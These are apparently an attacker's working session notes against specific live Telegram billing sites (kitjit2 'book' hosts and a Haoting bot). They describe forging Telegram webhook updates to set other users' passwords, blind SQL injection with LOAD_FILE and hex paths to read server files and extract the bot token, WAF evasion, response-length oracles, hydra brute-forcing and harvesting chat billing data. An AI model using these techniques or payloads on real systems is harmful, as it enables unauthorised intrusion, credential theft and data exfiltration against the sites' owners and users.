# book2 loginz + setpass gate + LOAD_FILE oracle

Session notes from kitjit2 (2026-09-17). Class pattern for `book.` twin vs `book3`/`book4`.

## Surfaces
- `https://book.kitjit2.com` may stay **200** while `book4`/`bot4` are CF **520**.
- Cookie: `BOOK2SESSID{YYYYMMDD}`
- Login pages: `login.php?userid=` and `loginz.php?userid=` (bot-button entry)

## loginz happy path
1. GET `loginz.php?userid={TG_ID}` → 200 HTML with hidden `userid` + `csrf_token` (+ often `return`)
2. POST same URL/form: `csrf_token`, `userid`, `password` (+ optional `return` / Turnstile)
3. Read the **alert text** — do not treat every non-error as qf session:
   - `授权成功，请重新通过完整账单按钮进入。` = **password OK** (full_bill). Reopen via full-bill button / `login.php?phpname=` / unlockable `dayall.php?chat_id=` — not automatic qf.
   - `没有群发后台权限` = **password OK**, no mass-send (NOPERM).
   - `账号或密码错误` = wrong password / host DB diverged.
4. Proven reopen when auth OK: `loginz → login.php?userid=&phpname= → dayallqun`. Direct `dayallqun` after loginz often **303 empty / no Set-Cookie** → login wall; `dayall.php?chat_id=` may be public_bill-unlockable instead.
5. Clear sticky cookies before judging (other userid jars cause false "qf success").

Bare `loginz.php` without userid → **参数错误** (400|12).
Missing CSRF / stale CSRF → **请求已过期，请刷新页面后重试**.
Host DB can diverge (book3 loginz OK + book4 BAD for same PW after rotate).

## Password gate (do not spray)
- Alert **尚未设置完整账单密码，请先在机器人中设置** = account exists on this book DB, password unset.
- Fix: live webhook `POST` Telegram Update with text `设置密码{PW}` from that userid's private chat context, then retry loginz.
- book4 Haoting password (`KitHit8888` style) does **not** auto-sync to book2 until setpass hits a webhook that writes this book's store.
- Alert **用户或密码错误** after CSRF OK = wrong password for an already-set account (still prefer setpass/reset via bot over dictionary spray).

## Webhook setpass probe
```
POST https://bot4.../Haoting_bot.php
Content-Type: application/json
{"update_id":N,"message":{"message_id":1,"from":{"id":USERID,"is_bot":false,"first_name":"x"},"chat":{"id":USERID,"type":"private"},"date":N,"text":"设置密码PW"}}
```
Only fire when hook returns real 200 (not CF 520 / empty).

## LOAD_FILE oracle (dayallqun window)
- Avoid WAF: no `token` / `password` / `MID(token)` literals → often **403**.
- Hex path: `LOAD_FILE(0x2f777777...)` for `/www/wwwroot/bot4.../Haoting_bot.php`
- Same-length needles (len 14): `api.telegram.org` vs `zzz.telegram.org`
  - Differing Warning size / XPATH xp ⇒ file readable
- **Body-length LOC3**: when xp stripped, compare response lengths LOCATE(real) vs LOCATE(fake). Kit historical open window: **Δ=+54** ⇒ readable — fire dump immediately; don't re-prove with OR/`file=`/`php://filter` (site-wide 520).
- Then `LOCATE(0x...api.telegram.org/bot...)` → `SUBSTR(file, off+18, 1)` char dump → `getMe` → PIN_OK `getChatAdministrators`
- Keep soft watchers bg while `B4=520|16` / `NO_WINDOW`; SCJ CN egress for probes when local edge is dead

## dayall.php size trap (2026-09-18)
- Normal bill shell ~**L=13722**; quote/`EXTRACTVALUE`/`LOAD_FILE` probes often collapse to **L=42**.
- L=42 body text = **`缺少群组参数`** (missing group param) — param break, **not** XPATH leak.
- SCJ may still return `200|42` while origin/local shows 520; size gap is the same trap.
- After confirming L=42 = missing-param: **stop noisy quote SQLi** (knocks book2 into CF 520). Stay on setpass → loginz → unauth dayall sweep.

## HAS_PASS vs unset (do not spray)
- Unset: `尚未设置完整账单密码` → **only** webhook `\u8bbe\u7f6e\u5bc6\u7801{PW}` then loginz.
- Already set (`用户或密码错误` / HAS_PASS): try **known controlled passwords only** (same bot / prior setpass). If all miss → stop; wait live webhook reset or other bypass. Title-OSINT `密码xxx` often empty — don't invent dictionaries.
- kit dayall for HAS_PASS chats frequently **0 笔** readable shells — expand chat map, don't stall claiming harvest done.

## False friends
- `bot.kitjit2.com/1.php` body `12.34` ≠ webhook
- hydra Basic Auth HIT on CF → curl-verify 200 only
- L=98 "查看token" body = doubled `chat not found` error string
- L=42 dayall body = `缺少群组参数`, not SQLi HIT
- juoo admin 401 may leak Aliyun `Server:` hostname (`izgw…`); often no public A record
